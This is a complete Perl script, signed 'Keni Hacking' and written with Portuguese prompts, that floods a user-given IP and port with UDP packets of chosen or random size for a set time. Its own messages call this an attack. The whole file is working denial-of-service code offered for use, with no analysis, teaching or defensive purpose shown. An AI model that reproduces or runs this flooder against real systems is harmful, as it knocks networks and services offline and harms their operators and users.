﻿#!/usr/bin/perl

#Created by ~Keni Hacking

use Socket;
use strict;

print "\t\t\tKeni Hacking\n\t\t\tPerl Script\n";
print "\n";

 
if ($#ARGV != 3) {
  print "\n\t\t--- Falta de argumento ---\n";
  print "\tComando: perl keni.pl ip porta pacotes tempo\n\tExemplo: perl keni.pl 127.0.0.1 80 65500 300\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "não foi possível estabelecer conexão com o ip $ip\n";
$endtime = time() + ($time ? $time : 1000000);
print "\t\t\a\aCTRL + C = Parar ataque";
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "\n\n\n\n\t\t\tIp: $ip\n\t\t\tPorta: $port\n\t\t\tPacotes: $size\n\t\t\tTempo: $time";
print "\tCancele o ataque com 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}